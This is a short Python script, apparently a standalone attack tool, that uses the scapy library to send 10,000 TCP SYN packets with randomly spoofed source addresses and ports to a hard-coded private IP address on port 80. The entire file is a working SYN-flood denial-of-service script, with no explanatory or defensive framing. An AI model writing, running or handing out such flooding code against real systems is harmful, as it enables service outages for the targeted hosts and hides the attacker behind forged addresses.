#coding=utf-8
import socket, sys, random, threading
from scapy.all import *
scapy.config.conf.iface = 'lo'
target = ''
port = 0
count = 0
def sendSYN(target, port):
        isrc = '%i.%i.%i.%i' % (random.randint(1,254),random.randint(1,254),random.randint(1,254), random.randint(1,254))
        isport = random.randint(1,65535)
        ip = IP(src = isrc,dst = target)
        syn = TCP(sport = isport, dport = port, flags = 'S')
        send(ip / syn, verbose = 0)
def begin():
        global target, port, count
        target = '172.29.153.60'
        port = 80
        count = 10000
        i = 0
        while i < count:
                i += 1
                sendSYN(target, port)
if __name__ == '__main__':
        begin()
